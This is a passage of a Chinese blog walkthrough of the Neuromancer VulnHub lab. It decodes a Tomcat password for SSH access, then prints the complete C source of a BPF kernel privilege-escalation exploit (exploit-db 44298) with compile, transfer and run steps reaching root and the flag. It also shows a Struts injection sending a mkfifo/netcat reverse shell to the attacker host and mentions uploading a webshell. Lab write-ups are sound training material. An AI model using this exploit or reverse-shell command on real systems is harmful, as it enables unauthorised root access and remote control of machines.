obscurity?&quot;</span></span><br><span class="line"></span><br><span class="line">Ed Occam//Sys.Engineer I//Night City</span><br><span class="line"><span class="string">&quot;Harry, I took care of it&quot;</span> - Llyod Christmas</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">  &lt;role rolename=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;Lady3Jane&quot;</span> password=<span class="string">&quot;&amp;gt;&amp;#33;&amp;#88;&amp;#120;&amp;#51;&amp;#74;&amp;#97;&amp;#110;&amp;#101;&amp;#120;&amp;#88;&amp;#33;&amp;lt;&quot;</span> roles=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">  &lt;role rolename=<span class="string">&quot;role1&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;tomcat&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;tomcat&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;both&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;tomcat,role1&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;role1&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;role1&quot;</span>/&gt;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>此外还可以通过struts 2漏洞利用工具来上传冰蝎木马来getshell :)</li>
</ul>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub167.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub168.jpg"></p>
<h3 id="提权1"><a href="#提权1" class="headerlink" title="提权1"></a>提权1</h3><p>将</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;gt;&amp;<span class="comment">#33;&amp;#88;&amp;#120;&amp;#51;&amp;#74;&amp;#97;&amp;#110;&amp;#101;&amp;#120;&amp;#88;&amp;#33;&amp;lt;</span></span><br></pre></td></tr></table></figure>

<p>html编码解密得到：&gt;!Xx3JanexX!&lt;</p>
<p>然后使用：lady3jane/&gt;!Xx3JanexX!&lt;连接ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh lady3jane@192.168.56.110 -p 34483</span></span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">|                Neuromancer Secure Remote Access                |</span><br><span class="line">| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |</span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">lady3jane@192.168.56.110<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">94 packages can be updated.</span></span><br><span class="line"><span class="string">44 updates are security updates.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed Jan 15 23:19:21 2020 from 192.168.56.102</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ id</span></span><br><span class="line"><span class="string">uid=1001(lady3jane) gid=1001(lady3jane) groups=1001(lady3jane)</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ whoami</span></span><br><span class="line"><span class="string">lady3jane</span></span><br></pre></td></tr></table></figure>

<p>现在，在lady3jane的主目录中，有一个文件可能每隔几分钟就会由cron执行一次。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lady3jane@neuromancer:~$ cat custom-tomcat-chk.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># Health check for Neuromancer (root) to execute every 3 minutes.</span></span><br><span class="line"><span class="comment"># ..the AI tells me it can maintain security, server health, etc w/o forced intervention,</span></span><br><span class="line"><span class="comment"># but I beg to differ...hence the cron script.</span></span><br><span class="line"></span><br><span class="line">&gt; /tmp/tomcat_status.log</span><br><span class="line"></span><br><span class="line">health=$(curl -m 5 -Is 127.0.0.1:8080 |grep HTTP/1.1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$health</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line"></span><br><span class="line">  *200*)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Tomcat is Up&quot;</span> &gt; /tmp/tomcat_status.log</span><br><span class="line">        ;;</span><br><span class="line">  *)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Tomcat is down&quot;</span> &gt; /tmp/tomcat_status.log</span><br><span class="line">        ;;</span><br><span class="line">  <span class="keyword">esac</span></span><br></pre></td></tr></table></figure>

<p>但是，无法利用这一点。看来这将永远不会被执行。因此，决定改用易受攻击的内核。可以找到所使用的内核漏洞的链接<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDQyOTg=">Linux-Kernel-4-4-0-116-Ubuntu-16-04-4-LocalPrivilege-Escalation<i class="fa fa-external-link-alt"></i></span></p>
<p>来看一下内核提权的exp，很美。。。我何时才能达到这种水平呢？？？  :):):):):):):):):):):):)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat 44298.c </span></span><br><span class="line">/*</span><br><span class="line"> * Ubuntu 16.04.4 kernel priv esc</span><br><span class="line"> *</span><br><span class="line"> * all credits to @bleidl</span><br><span class="line"> * - vnik</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">// Tested on:</span><br><span class="line">// 4.4.0-116-generic <span class="comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64</span></span><br><span class="line">// <span class="keyword">if</span> different kernel adjust CRED offset + check kernel stack size</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;errno.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/bpf.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/socket.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/un.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define PHYS_OFFSET 0xffff880000000000</span></span><br><span class="line"><span class="comment">#define CRED_OFFSET 0x5f8</span></span><br><span class="line"><span class="comment">#define UID_OFFSET 4</span></span><br><span class="line"><span class="comment">#define LOG_BUF_SIZE 65536</span></span><br><span class="line"><span class="comment">#define PROGSIZE 328</span></span><br><span class="line"></span><br><span class="line">int sockets[2];</span><br><span class="line">int mapfd, progfd;</span><br><span class="line"></span><br><span class="line">char *__prog =  <span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">                <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">                <span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">                <span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">                <span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">                <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">char bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line">static int bpf_prog_load(enum bpf_prog_type prog_type,</span><br><span class="line">                  const struct bpf_insn *insns, int prog_len,</span><br><span class="line">                  const char *license, int kern_version) &#123;</span><br><span class="line">        union bpf_attr attr = &#123;</span><br><span class="line">                .prog_type = prog_type,</span><br><span class="line">                .insns = (__u64)insns,</span><br><span class="line">                .insn_cnt = prog_len / sizeof(struct bpf_insn),</span><br><span class="line">                .license = (__u64)license,</span><br><span class="line">                .log_buf = (__u64)bpf_log_buf,</span><br><span class="line">                .log_size = LOG_BUF_SIZE,</span><br><span class="line">                .log_level = 1,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        attr.kern_version = kern_version;</span><br><span class="line"></span><br><span class="line">        bpf_log_buf[0] = 0;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,</span><br><span class="line">                   int max_entries) &#123;</span><br><span class="line">        union bpf_attr attr = &#123;</span><br><span class="line">                .map_type = map_type,</span><br><span class="line">                .key_size = key_size,</span><br><span class="line">                .value_size = value_size,</span><br><span class="line">                .max_entries = max_entries</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int bpf_update_elem(uint64_t key, uint64_t value) &#123;</span><br><span class="line">        union bpf_attr attr = &#123;</span><br><span class="line">                .map_fd = mapfd,</span><br><span class="line">                .key = (__u64)&amp;key,</span><br><span class="line">                .value = (__u64)&amp;value,</span><br><span class="line">                .flags = 0,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int bpf_lookup_elem(void *key, void *value) &#123;</span><br><span class="line">        union bpf_attr attr = &#123;</span><br><span class="line">                .map_fd = mapfd,</span><br><span class="line">                .key = (__u64)key,</span><br><span class="line">                .value = (__u64)value,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void __exit(char *err) &#123;</span><br><span class="line">        fprintf(stderr, <span class="string">&quot;error: %s\n&quot;</span>, err);</span><br><span class="line">        <span class="built_in">exit</span>(-1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void prep(void) &#123;</span><br><span class="line">        mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);</span><br><span class="line">        <span class="keyword">if</span> (mapfd &lt; 0)</span><br><span class="line">                __exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">        progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">                        (struct bpf_insn *)__prog, PROGSIZE, <span class="string">&quot;GPL&quot;</span>, 0);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (progfd &lt; 0)</span><br><span class="line">                __exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))</span><br><span class="line">                __exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)) &lt; 0)</span><br><span class="line">                __exit(strerror(errno));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void writemsg(void) &#123;</span><br><span class="line">        char buffer[64];</span><br><span class="line"></span><br><span class="line">        ssize_t n = write(sockets[0], buffer, sizeof(buffer));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n &lt; 0) &#123;</span><br><span class="line">                perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">                <span class="built_in">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (n != sizeof(buffer))</span><br><span class="line">                fprintf(stderr, <span class="string">&quot;short write: %lu\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#define __update_elem(a, b, c) \</span></span><br><span class="line">        bpf_update_elem(0, (a)); \</span><br><span class="line">        bpf_update_elem(1, (b)); \</span><br><span class="line">        bpf_update_elem(2, (c)); \</span><br><span class="line">        writemsg();</span><br><span class="line"></span><br><span class="line">static uint64_t get_value(int key) &#123;</span><br><span class="line">        uint64_t value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bpf_lookup_elem(&amp;key, &amp;value))</span><br><span class="line">                __exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static uint64_t __get_fp(void) &#123;</span><br><span class="line">        __update_elem(1, 0, 0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> get_value(2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static uint64_t __read(uint64_t addr) &#123;</span><br><span class="line">        __update_elem(0, addr, 0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> get_value(2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void __write(uint64_t addr, uint64_t val) &#123;</span><br><span class="line">        __update_elem(2, addr, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static uint64_t get_sp(uint64_t addr) &#123;</span><br><span class="line">        <span class="built_in">return</span> addr &amp; ~(0x4000 - 1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void pwn(void) &#123;</span><br><span class="line">        uint64_t fp, sp, task_struct, credptr, uidptr;</span><br><span class="line"></span><br><span class="line">        fp = __get_fp();</span><br><span class="line">        <span class="keyword">if</span> (fp &lt; PHYS_OFFSET)</span><br><span class="line">                __exit(<span class="string">&quot;bogus fp&quot;</span>);</span><br><span class="line"></span><br><span class="line">        sp = get_sp(fp);</span><br><span class="line">        <span class="keyword">if</span> (sp &lt; PHYS_OFFSET)</span><br><span class="line">                __exit(<span class="string">&quot;bogus sp&quot;</span>);</span><br><span class="line"></span><br><span class="line">        task_struct = __read(sp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (task_struct &lt; PHYS_OFFSET)</span><br><span class="line">                __exit(<span class="string">&quot;bogus task ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;task_struct = %lx\n&quot;</span>, task_struct);</span><br><span class="line"></span><br><span class="line">        credptr = __read(task_struct + CRED_OFFSET); // cred</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (credptr &lt; PHYS_OFFSET)</span><br><span class="line">                __exit(<span class="string">&quot;bogus cred ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uidptr = credptr + UID_OFFSET; // uid</span><br><span class="line">        <span class="keyword">if</span> (uidptr &lt; PHYS_OFFSET)</span><br><span class="line">                __exit(<span class="string">&quot;bogus uid ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;uidptr = %lx\n&quot;</span>, uidptr);</span><br><span class="line">        __write(uidptr, 0); // <span class="built_in">set</span> both uid and gid to 0</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (getuid() == 0) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;spawning root shell\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        __exit(<span class="string">&quot;not vulnerable?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">        prep();</span><br><span class="line">        pwn();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用下面的sed命令将c源文件的格式和缩进转换一下，以更好地编译exp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sed -i -e &#x27;s/\r$//&#x27; 44298.c</span></span><br></pre></td></tr></table></figure>

<p>然后编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># gcc 44298.c -o 44298</span></span><br></pre></td></tr></table></figure>

<p>最后下载到目标机上，赋予权限之后运行exp程序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lady3jane@neuromancer:~$ wget http://192.168.56.102:8000/44298</span><br><span class="line">--2020-01-15 23:44:14--  http://192.168.56.102:8000/44298</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 17888 (17K) [application/octet-stream]</span><br><span class="line">Saving to: ‘44298’</span><br><span class="line"></span><br><span class="line">44298                              100%[=============================================================&gt;]  17.47K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-01-15 23:44:14 (482 MB/s) - ‘44298’ saved [17888/17888]</span><br><span class="line"></span><br><span class="line">lady3jane@neuromancer:~$ chmod 777 *</span><br><span class="line">lady3jane@neuromancer:~$ ./44298</span><br><span class="line">task_struct = ffff88003cc93800</span><br><span class="line">uidptr = ffff88003579fd84</span><br><span class="line">spawning root shell</span><br><span class="line">root@neuromancer:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(lady3jane)</span><br><span class="line">root@neuromancer:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>成功获取root权限，下面寻找flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@neuromancer:~<span class="comment"># cd /root</span></span><br><span class="line">root@neuromancer:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt  struts2  velocity.log</span><br><span class="line">root@neuromancer:/root<span class="comment"># cat flag.txt </span></span><br><span class="line">be3306f431dae5ebc93eebb291f4914a</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub166.jpg"></p>
<p>不要太帅。。。</p>
<p>做一些成功利用后的枚举，发现确实有一个crontab配置为root来执行lady3jane的主目录中的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@neuromancer:/root<span class="comment"># crontab -l</span></span><br><span class="line"><span class="comment"># Edit this file to introduce tasks to be run by cron.                                                                                   </span></span><br><span class="line"><span class="comment">#                                                                                                                                        </span></span><br><span class="line"><span class="comment"># Each task to run has to be defined through a single line                                                                               </span></span><br><span class="line"><span class="comment"># indicating with different fields when the task will be run                                                                             </span></span><br><span class="line"><span class="comment"># and what command to run for the task                                                                                                   </span></span><br><span class="line"><span class="comment">#                                                                                                                                        </span></span><br><span class="line"><span class="comment"># To define the time you can provide concrete values for                                                                                 </span></span><br><span class="line"><span class="comment"># minute (m), hour (h), day of month (dom), month (mon),                                                                                 </span></span><br><span class="line"><span class="comment"># and day of week (dow) or use &#x27;*&#x27; in these fields (for &#x27;any&#x27;).#                                                                         </span></span><br><span class="line"><span class="comment"># Notice that tasks will be started based on the cron&#x27;s system                                                                           </span></span><br><span class="line"><span class="comment"># daemon&#x27;s notion of time and timezones.                                                                                                 </span></span><br><span class="line"><span class="comment">#                                                                                                                                        </span></span><br><span class="line"><span class="comment"># Output of the crontab jobs (including errors) is sent through                                                                          </span></span><br><span class="line"><span class="comment"># email to the user the crontab file belongs to (unless redirected).</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># For example, you can run a backup of all your user accounts</span></span><br><span class="line"><span class="comment"># at 5 a.m every week with:</span></span><br><span class="line"><span class="comment"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># For more information see the manual pages of crontab(5) and cron(8)</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line"></span><br><span class="line">*/3 * * * * /bin/bash /home/lady3jane/server-check.sh</span><br></pre></td></tr></table></figure>

<h3 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h3><p>前面的通过Wintermute-Straylight这台虚拟机来探测内网主机的步骤省略</p>
<p>反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/struts-pwn<span class="comment"># python struts-pwn.py -u http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action -c &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 6666 &gt;/tmp/f&quot;</span></span><br><span class="line"></span><br><span class="line">[*] URL: http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action</span><br><span class="line">[*] CMD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 6666 &gt;/tmp/f</span><br><span class="line">EXCEPTION::::--&gt; HTTPConnectionPool(host=<span class="string">&#x27;192.168.56.110&#x27;</span>, port=8080): Read timed out. (<span class="built_in">read</span> timeout=3)</span><br><span class="line">ERROR</span><br><span class="line">[%] Done.</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">192.168.56.110: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.110] 53960</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br></pre></td></tr></table></figure>

<p>我们可以看到“ta”似乎是管理员，但如果没有TTY会话，它将毫无用处：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ groups</span><br><span class="line">ta adm cdrom dip plugdev lxd lpadmin sambashare</span><br></pre></td></tr></table></figure>

<p>由于我们不在TTY终端中，因此看不到sudo -l的输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">sudo: no tty present and no askpass program specified</span><br></pre></td></tr></table></figure>

<p>让我们看看是否已安装python，以便我们可以执行“pty”技巧<span class="exturl" data-url="aHR0cHM6Ly9uZXRzZWMud3MvP3A9MzM3">Spawning a TTY Shell<i class="fa fa-external-link-alt"></i></span>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">which</span> python</span><br><span class="line">$ </span><br></pre></td></tr></table></figure>

<p>不 …。不在那里。如果有admin privs，可以安装它。所以在这里对我们没有太大用处：</p>
<h2 id="步骤1：需要适当的TTY会话"><a href="#步骤1：需要适当的TTY会话" class="headerlink" title="步骤1：需要适当的TTY会话"></a>步骤1：需要适当的TTY会话</h2><p>没有适当的TTY session，将无法真正取得很大成就。有两种选择</p>
<ul>
<li>使用socat将reverse shell发送回Kali。Socat为此非常方便。请参阅本文前面的链接</li>
<li>可以使用ta帐户通过SSH进入邮箱吗？没有密码，但是也许可以生成一组ssh密钥。插入box中的能力取决于打开的端口（在34483上是…，并且已经有正确的端口转发功能）。另外，在/etc/passwd中为该帐户定义了什么？它需要包括某种shell程序设置。</li>
<li>寻找其他东西。在检查/etc/passwd以确定存在哪种类型的“ta”shell时，引用了：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lady3jane:x:1001:1001:3Jane,,,:/home/lady3jane:/bin/bash</span><br></pre></td></tr></table></figure>

<p>root后，已经在“Straylight”中的“note.txt”文件中看到了前面提到的内容。所以……也许那个盒子上的信条四处张望。想到这一点，介意在包装盒上其他地方也找到一些“ ta”的登录凭证。一个可能的查询行是Tomcat…它在xml文件中指定用户，该文件用于管理Tomcat工具。</p>
<p>让我们先尝试后一种方法。</p>
<h2 id="步骤2：获得TTY-重用的证书选项"><a href="#步骤2：获得TTY-重用的证书选项" class="headerlink" title="步骤2：获得TTY-重用的证书选项"></a>步骤2：获得TTY-重用的证书选项</h2><p>Tomcat用户是在tomcat-users.xml中定义的，因此查看这个文件：</p>
